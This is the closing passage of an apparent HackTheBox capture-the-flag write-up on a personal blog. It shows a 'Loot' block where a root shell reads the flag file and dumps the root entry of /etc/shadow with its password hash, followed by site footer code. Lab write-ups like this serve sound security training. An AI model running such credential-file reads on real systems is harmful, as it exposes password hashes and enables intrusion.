</span></span></code></pre></td></tr></table></div></div><p>Loot:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># cat /mnt/root/root/root.txt
</span></span><span class=line><span class=cl>3b89a121fa4338f7835fedb1f62b8cdc
</span></span><span class=line><span class=cl># cat /mnt/root/etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>